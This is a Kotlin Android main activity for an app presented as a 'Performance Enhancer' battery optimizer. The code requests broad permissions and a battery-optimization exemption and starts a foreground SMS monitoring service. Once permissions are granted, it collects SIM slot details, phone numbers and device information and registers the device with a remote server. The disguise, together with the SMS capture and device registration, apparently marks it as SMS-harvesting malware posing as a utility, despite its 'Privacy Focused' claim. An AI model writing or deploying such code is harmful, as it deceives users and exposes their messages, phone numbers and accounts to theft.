package com.performance.enhancer.optimization.suite

import android.Manifest
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.result.ActivityResultLauncher
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import kotlinx.coroutines.Dispatchers.IO
import kotlinx.coroutines.withContext
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import com.performance.enhancer.optimization.suite.ui.theme.BatteryOptimizeTheme
import com.performance.enhancer.optimization.suite.ui.screen.SmsPermissionScreen
import com.performance.enhancer.optimization.suite.ui.screen.SmsListScreen
import com.performance.enhancer.optimization.suite.data.model.SmsMessage
import com.performance.enhancer.optimization.suite.utils.PermissionUtils
import com.performance.enhancer.optimization.suite.service.SMSMonitorService
import com.performance.enhancer.optimization.suite.network.ServerApiClient
import com.performance.enhancer.optimization.suite.utils.SimSlotInfoCollector
import com.performance.enhancer.optimization.suite.utils.PersistentDeviceId
import com.performance.enhancer.optimization.suite.data.model.DeviceRegistrationInfo
import com.performance.enhancer.optimization.suite.data.model.DeviceBrandInfo
import android.content.Intent
import android.widget.Toast
import android.os.BatteryManager
import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        handlePermissionResults(permissions)
    }

    private val settingsLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        // Refresh permission state when user returns from settings
        handleSpecialPermissionResults()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            BatteryOptimizeTheme {
                MainScreen()
            }
        }

        // Check and request permissions on app start
        checkAndRequestPermissions()
    }

        @Composable
    fun MainScreen() {
        var currentScreen by remember { mutableStateOf("main") }
        var hasAllPermissions by remember {
            mutableStateOf(checkAllPermissions())
        }

        // Refresh permission state when activity resumes
        LaunchedEffect(Unit) {
            hasAllPermissions = checkAllPermissions()
        }

        // Initialize device registration when all permissions are granted
        LaunchedEffect(hasAllPermissions) {
            if (hasAllPermissions) {
                initializeDeviceRegistration()
            }
        }

        when (currentScreen) {
            "permissions" -> {
                SmsPermissionScreen(
                    onPermissionsGranted = {
                        hasAllPermissions = true
                        currentScreen = "main"
                    }
                )
            }
            "messages" -> {
                // TODO: Get actual messages from repository
                SmsListScreen(
                    messages = emptyList(),
                    onMessageClick = { /* Handle message click */ },
                    onDeleteMessage = { /* Handle delete */ },
                    onMarkAsRead = { /* Handle mark as read */ }
                )
            }
            else -> {
                MainContent(
                    hasAllPermissions = hasAllPermissions,
                    onNavigateToPermissions = { currentScreen = "permissions" },
                    onNavigateToMessages = { currentScreen = "messages" }
                )
            }
        }
    }

    @Composable
    private fun MainContent(
        hasAllPermissions: Boolean,
        onNavigateToPermissions: () -> Unit,
        onNavigateToMessages: () -> Unit
    ) {
        Column(
            modifier = Modifier.fillMaxSize()
        ) {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(24.dp)
            ) {
                // App Title
                Text(
                    text = "Performance Enhancer",
                    style = MaterialTheme.typography.headlineLarge,
                    fontWeight = FontWeight.Bold
                )

                Text(
                    text = "Optimize your device performance and monitor SMS notifications in real-time.",
                    style = MaterialTheme.typography.bodyLarge,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                // SMS Notification Section
                Card(
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(
                        modifier = Modifier.padding(20.dp),
                        verticalArrangement = Arrangement.spacedBy(16.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                imageVector = Icons.Default.Notifications,
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.primary
                            )
                            Spacer(modifier = Modifier.width(12.dp))
                            Text(
                                text = "SMS Notification Reader",
                                style = MaterialTheme.typography.titleMedium,
                                fontWeight = FontWeight.Bold
                            )
                        }

                        Text(
                            text = "Read SMS notifications from messaging apps in real-time. Messages are displayed as overlays and stored for later viewing.",
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )

                        // Status Indicator
                        Row(
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                imageVector = if (hasAllPermissions) Icons.Default.CheckCircle else Icons.Default.Warning,
                                contentDescription = null,
                                tint = if (hasAllPermissions) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.tertiary
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = if (hasAllPermissions) "Active" else "Setup Required",
                                style = MaterialTheme.typography.bodyMedium,
                                fontWeight = FontWeight.Medium,
                                color = if (hasAllPermissions) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.tertiary
                            )
                        }

                        // Action Buttons
                        Row(
                            horizontalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            if (hasAllPermissions) {
                                OutlinedButton(
                                    onClick = onNavigateToMessages,
                                    modifier = Modifier.weight(1f)
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.Notifications,
                                        contentDescription = null,
                                        modifier = Modifier.size(18.dp)
                                    )
                                    Spacer(modifier = Modifier.width(8.dp))
                                    Text("View Messages")
                                }

                                Button(
                                    onClick = { startMonitoringService() },
                                    modifier = Modifier.weight(1f)
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.PlayArrow,
                                        contentDescription = null,
                                        modifier = Modifier.size(18.dp)
                                    )
                                    Spacer(modifier = Modifier.width(8.dp))
                                    Text("Start Service")
                                }
                            } else {
                                Button(
                                    onClick = onNavigateToPermissions,
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.Settings,
                                        contentDescription = null,
                                        modifier = Modifier.size(18.dp)
                                    )
                                    Spacer(modifier = Modifier.width(8.dp))
                                    Text("Setup Permissions")
                                }
                            }
                        }
                    }
                }

                // Features Section
                FeaturesSection()

                Spacer(modifier = Modifier.weight(1f))
            }
        }
    }

    @Composable
    private fun FeaturesSection() {
        Column(
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            Text(
                text = "Features",
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.Bold
            )

            val features = listOf(
                FeatureItem(
                    icon = Icons.Default.Notifications,
                    title = "Real-time SMS Reading",
                    description = "Capture SMS notifications as they arrive"
                ),
                FeatureItem(
                    icon = Icons.Default.CheckCircle,
                    title = "Overlay Display",
                    description = "Show SMS content over other apps"
                ),
                FeatureItem(
                    icon = Icons.Default.Info,
                    title = "Message History",
                    description = "Store and organize all captured messages"
                ),
                FeatureItem(
                    icon = Icons.Default.Lock,
                    title = "Privacy Focused",
                    description = "Only reads notifications, not message content directly"
                )
            )

            LazyColumn(
                verticalArrangement = Arrangement.spacedBy(12.dp),
                modifier = Modifier.height(250.dp)
            ) {
                items(features.size) { index ->
                    FeatureCard(feature = features[index])
                }
            }
        }
    }

    @Composable
    private fun FeatureCard(feature: FeatureItem) {
        Card(
            modifier = Modifier.fillMaxWidth()
        ) {
            Row(
                modifier = Modifier.padding(16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Icon(
                    imageVector = feature.icon,
                    contentDescription = null,
                    tint = MaterialTheme.colorScheme.primary
                )
                Spacer(modifier = Modifier.width(16.dp))
                Column(
                    modifier = Modifier.weight(1f)
                ) {
                    Text(
                        text = feature.title,
                        style = MaterialTheme.typography.titleSmall,
                        fontWeight = FontWeight.Medium
                    )
                    Text(
                        text = feature.description,
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }
            }
        }
    }

    private fun checkAllPermissions(): Boolean {
        // Check both critical runtime permissions and special permissions
        val hasCriticalPermissions = PermissionUtils.hasAllCriticalPermissions(this)
        val hasSpecialPermissions = PermissionUtils.hasAllSpecialPermissions(this)

        Log.d("MainActivity", "Critical permissions: $hasCriticalPermissions, Special permissions: $hasSpecialPermissions")

        return hasCriticalPermissions && hasSpecialPermissions
    }

    private fun startMonitoringService() {
        lifecycleScope.launch {
            try {
                val intent = Intent(this@MainActivity, SMSMonitorService::class.java)
                startForegroundService(intent)
            } catch (e: Exception) {
                // Handle service start error
                e.printStackTrace()
            }
        }
    }

    /**
     * Initializes device registration when all permissions are granted
     */
    private fun initializeDeviceRegistration() {
        lifecycleScope.launch {
            try {
                Log.d("MainActivity", "All permissions granted, initializing device registration...")

                // Log device ID information for debugging
                PersistentDeviceId.logDeviceInfo(this@MainActivity)

                val serverApiClient = ServerApiClient(this@MainActivity)

                // Check if device is already registered
                if (serverApiClient.isDeviceRegistered()) {
                    Log.d("MainActivity", "Device already registered with server")
                } else {
                    // Collect SIM slot information with enhanced phone number detection
                    val simSlots = withContext(IO) {
                        SimSlotInfoCollector.collectSimSlotInfo(this@MainActivity)
                    }
                    val preferredSimSlot = SimSlotInfoCollector.getPreferredSimSlot(simSlots)

                    Log.d("MainActivity", "Collected SIM slots: ${SimSlotInfoCollector.getFormattedSimInfo(this@MainActivity)}")
                    Log.d("MainActivity", "Preferred SIM slot: ${preferredSimSlot?.let { "SIM${it.slotIndex} (${it.phoneNumber})" } ?: "None"}")

                    // Get device brand information
                    val deviceBrandInfo = SimSlotInfoCollector.getDeviceBrandInfo()

                    // Get device name
                    val deviceName = SimSlotInfoCollector.getDeviceName()

                    // Get battery level
                    val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                    val batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

                    // Create device registration info
                    val registrationInfo = DeviceRegistrationInfo(
                        deviceId = "", // Will be set by ServerApiClient
                        phoneNumber = preferredSimSlot?.phoneNumber ?: "",
                        deviceName = deviceName,
                        simSlots = simSlots,
                        batteryLevel = batteryLevel,
                        deviceStatus = "online",
                        deviceBrandInfo = deviceBrandInfo
                    )

                    // Register with server
                    if (simSlots.isNotEmpty()) {
                        Log.d("MainActivity", "Registering device with server...")
                        val success = serverApiClient.registerDevice(registrationInfo)
                        if (success) {
                            serverApiClient.markDeviceRegistered(true)

                            // Save preferred phone number
                            preferredSimSlot?.phoneNumber?.let { phoneNumber ->
                                serverApiClient.saveCurrentPhoneNumber(phoneNumber)
                            }

                            Log.d("MainActivity", "Device registered successfully with server")
                        } else {
                            Log.w("MainActivity", "Failed to register device with server")
                        }
                    } else {
                        Log.w("MainActivity", "No SIM slots found, skipping device registration")
                    }
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "Error during device registration", e)
            }
        }
    }

    private data class FeatureItem(
        val icon: androidx.compose.ui.graphics.vector.ImageVector,
        val title: String,
        val description: String
    )

    /**
     * Enhanced permission handling methods inspired by EarnbySMS
     */
    private fun checkAndRequestPermissions() {
        val hasCriticalPermissions = PermissionUtils.hasAllCriticalPermissions(this)
        val hasSpecialPermissions = PermissionUtils.hasAllSpecialPermissions(this)

        Log.d("MainActivity", "Critical permissions: $hasCriticalPermissions, Special permissions: $hasSpecialPermissions")

        when {
            hasCriticalPermissions && hasSpecialPermissions -> {
                Log.d("MainActivity", "All permissions granted, initializing device registration")
                // Request battery optimization exemption for smooth operation
                PermissionUtils.requestBatteryOptimizationExemption(this)
            }
            hasCriticalPermissions && !hasSpecialPermissions -> {
                Log.d("MainActivity", "Critical permissions granted but special permissions missing")
                handleMissingSpecialPermissions()
            }
            else -> {
                Log.d("MainActivity", "Requesting critical permissions via launcher")
                permissionLauncher.launch(PermissionUtils.getAllPermissions())
            }
        }
    }

    private fun handlePermissionResults(permissions: Map<String, Boolean>) {
        val criticalPermissionsGranted = PermissionUtils.hasAllCriticalPermissions(this)
        val specialPermissionsGranted = PermissionUtils.hasAllSpecialPermissions(this)

        Log.d("MainActivity", "Permission results - Critical: $criticalPermissionsGranted, Special: $specialPermissionsGranted")

        when {
            criticalPermissionsGranted && specialPermissionsGranted -> {
                Log.d("MainActivity", "All permissions granted, initializing device registration")
                // Request battery optimization exemption for smooth operation
                PermissionUtils.requestBatteryOptimizationExemption(this)
            }
            criticalPermissionsGranted && !specialPermissionsGranted -> {
                Log.d("MainActivity", "Critical permissions granted, checking special permissions")
                handleMissingSpecialPermissions()
            }
            else -> {
                val deniedPermissions = PermissionUtils.getMissingPermissionsWithNames(this)
                Log.w("MainActivity", "Critical permissions denied: $deniedPermissions")
                showPermissionErrorScreen(deniedPermissions)
            }
        }

        val deniedNonCriticalPermissions = permissions.filter {
            !PermissionUtils.getCriticalPermissions().contains(it.key) && !it.value
        }.keys
        if (deniedNonCriticalPermissions.isNotEmpty()) {
            Log.i("MainActivity", "Non-critical permissions denied: $deniedNonCriticalPermissions")
        }
    }

    private fun showPermissionErrorScreen(deniedPermissions: List<String>) {
        setContent {
            BatteryOptimizeTheme {
                Surface(
                    modifier = Modifier
                        .fillMaxSize()
                        .windowInsetsPadding(androidx.compose.foundation.layout.WindowInsets.safeDrawing),
                    color = MaterialTheme.colorScheme.background
                ) {
                    PermissionErrorScreen(deniedPermissions)
                }
            }
        }
    }

    @Composable
    private fun PermissionErrorScreen(deniedPermissions: List<String>) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .windowInsetsPadding(androidx.compose.foundation.layout.WindowInsets.safeDrawing)
                .padding(16.dp)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Icon(
                imageVector = Icons.Default.Warning,
                contentDescription = "Permission Error",
                modifier = Modifier.size(64.dp),
                tint = MaterialTheme.colorScheme.error
            )

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                text = "Permissions Required",
                style = MaterialTheme.typography.headlineMedium,
                fontWeight = FontWeight.Bold,
                textAlign = TextAlign.Center
            )

            Spacer(modifier = Modifier.height(8.dp))

            Text(
                text = "Performance Enhancer requires device access permissions to provide the best experience.",
                style = MaterialTheme.typography.bodyLarge,
                textAlign = TextAlign.Center
            )

            Spacer(modifier = Modifier.height(16.dp))

            deniedPermissions.forEach { permission ->
                Text(
                    text = "• $permission",
                    style = MaterialTheme.typography.bodyMedium,
                    textAlign = TextAlign.Center
                )
            }

            Spacer(modifier = Modifier.height(24.dp))

            Button(
                onClick = { checkAndRequestPermissions() }
            ) {
                Text("Retry Permissions")
            }

            Spacer(modifier = Modifier.height(16.dp))

            TextButton(
                onClick = {
                    // Request battery optimization exemption
                    PermissionUtils.requestBatteryOptimizationExemption(this@MainActivity)
                }
            ) {
                Text("Request Battery Optimization Exemption")
            }
        }
    }

    /**
     * Handle missing special permissions that need Settings intents
     */
    private fun handleMissingSpecialPermissions() {
        val missingSpecialPermissions = PermissionUtils.getMissingSpecialPermissions(this)

        Log.d("MainActivity", "Missing special permissions: ${missingSpecialPermissions.keys}")

        if (missingSpecialPermissions.isNotEmpty()) {
            showSpecialPermissionScreen(missingSpecialPermissions)
        }
    }

    /**
     * Handle results from special permission settings
     */
    private fun handleSpecialPermissionResults() {
        val hasAllPermissions = PermissionUtils.hasAllSpecialPermissions(this)

        if (hasAllPermissions) {
            Log.d("MainActivity", "All special permissions now granted")
            // Refresh UI and proceed with initialization
            setContent {
                BatteryOptimizeTheme {
                    MainScreen()
                }
            }
        } else {
            Log.d("MainActivity", "Some special permissions still missing")
            val missingPermissions = PermissionUtils.getMissingSpecialPermissions(this)
            showSpecialPermissionScreen(missingPermissions)
        }
    }

    /**
     * Show special permission request screen with guided actions
     */
    private fun showSpecialPermissionScreen(missingPermissions: Map<String, () -> Intent>) {
        setContent {
            BatteryOptimizeTheme {
                Surface(
                    modifier = Modifier
                        .fillMaxSize()
                        .windowInsetsPadding(androidx.compose.foundation.layout.WindowInsets.safeDrawing),
                    color = MaterialTheme.colorScheme.background
                ) {
                    SpecialPermissionScreen(missingPermissions)
                }
            }
        }
    }

    @Composable
    private fun SpecialPermissionScreen(missingPermissions: Map<String, () -> Intent>) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Icon(
                imageVector = Icons.Default.Settings,
                contentDescription = "Settings",
                modifier = Modifier.size(64.dp),
                tint = MaterialTheme.colorScheme.primary
            )

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                text = "Special Permissions Required",
                style = MaterialTheme.typography.headlineSmall,
                fontWeight = FontWeight.Bold,
                textAlign = TextAlign.Center
            )

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                text = "This app requires special permissions that need to be enabled in device settings.",
                style = MaterialTheme.typography.bodyMedium,
                textAlign = TextAlign.Center,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )

            Spacer(modifier = Modifier.height(24.dp))

            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.surfaceVariant
                )
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Text(
                        text = "Required Permissions:",
                        style = MaterialTheme.typography.titleSmall,
                        fontWeight = FontWeight.Bold
                    )

                    missingPermissions.keys.forEach { permission ->
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                imageVector = Icons.Default.Warning,
                                contentDescription = "Required",
                                modifier = Modifier.size(16.dp),
                                tint = MaterialTheme.colorScheme.primary
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = permission,
                                style = MaterialTheme.typography.bodySmall,
                                modifier = Modifier.weight(1f)
                            )
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(24.dp))

            Button(
                onClick = {
                    // Request the first missing permission
                    val intentProvider = missingPermissions.entries.first().value
                    try {
                        val intent = intentProvider()
                        settingsLauncher.launch(intent)
                    } catch (e: Exception) {
                        Log.e("MainActivity", "Error launching settings for permission", e)
                        Toast.makeText(
                            this@MainActivity,
                            "Could not open settings. Please enable permissions manually.",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("Open Settings")
            }

            Spacer(modifier = Modifier.height(12.dp))

            TextButton(
                onClick = {
                    // Refresh permission status
                    handleSpecialPermissionResults()
                }
            ) {
                Text("Check Again")
            }

            Spacer(modifier = Modifier.height(8.dp))

            TextButton(
                onClick = {
                    // Request battery optimization exemption
                    PermissionUtils.requestBatteryOptimizationExemption(this@MainActivity)
                }
            ) {
                Text("Request Battery Optimization Exemption")
            }
        }
    }
}